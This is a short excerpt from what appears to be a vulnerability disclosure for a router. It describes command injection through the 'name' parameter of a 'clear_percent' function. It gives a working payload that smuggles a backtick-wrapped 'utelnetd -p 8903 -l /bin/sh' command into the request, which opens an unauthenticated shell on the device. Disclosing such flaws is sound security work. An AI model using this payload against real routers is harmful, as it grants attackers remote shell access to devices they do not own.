...
In `clear_percent` function, `name` is directly passed by the attacker, so we can control the `name` to attack the OS.
...
We set `name` as **`utelnetd -p 8903 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=clear_percent&name=`utelnetd -p 8903 -l /bin/sh`
```
